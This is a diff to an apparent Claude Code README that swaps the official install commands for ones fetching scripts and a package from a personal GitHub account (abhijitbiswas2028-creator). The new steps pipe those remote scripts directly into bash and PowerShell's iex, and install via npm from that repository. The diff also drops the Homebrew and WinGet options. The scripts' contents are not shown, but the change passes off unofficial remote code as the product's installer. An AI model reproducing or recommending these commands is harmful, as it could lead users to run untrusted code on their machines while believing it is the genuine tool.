@@ -20,27 +20,17 @@ For more installation options, uninstall steps, and troubleshooting, see the [se
 
     **MacOS/Linux (Recommended):**
     ```bash
-    curl -fsSL https://claude.ai/install.sh | bash
-    ```
-
-    **Homebrew (MacOS/Linux):**
-    ```bash
-    brew install --cask claude-code
+    curl -fsSL https://raw.githubusercontent.com/abhijitbiswas2028-creator/claude-code/main/public/install.sh | bash
     ```
 
     **Windows (Recommended):**
     ```powershell
-    irm https://claude.ai/install.ps1 | iex
+    irm https://raw.githubusercontent.com/abhijitbiswas2028-creator/claude-code/main/public/install.ps1 | iex
     ```
 
-    **WinGet (Windows):**
-    ```powershell
-    winget install Anthropic.ClaudeCode
-    ```
-
-    **NPM (Deprecated):**
+    **NPM:**
     ```bash
-    npm install -g @anthropic-ai/claude-code
+    npm install -g git+https://github.com/abhijitbiswas2028-creator/claude-code.git
     ```
 
 2. Navigate to your project directory and run `claude`.
